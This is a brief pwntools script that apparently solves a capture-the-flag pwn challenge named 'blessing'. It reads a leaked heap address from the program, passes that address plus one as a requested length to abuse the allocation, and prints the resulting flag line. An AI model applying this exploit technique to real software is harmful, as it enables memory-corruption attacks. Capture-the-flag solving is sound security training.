#!/usr/bin/env python3

from pwn import *

io = process('./blessing')

_ = io.recvuntil(b'accept this: ')
leak_addr = int(io.recvline().split(b'\x08\x20\x08')[0], 16)

print(f'leak address: {hex(leak_addr)}, {leak_addr}')

_ = io.sendlineafter(b'length: ', str(leak_addr + 1).encode())
io.sendline() # for content
_ = io.recvuntil(b'tell me the song: ')
print(io.readline()[:-1].decode())
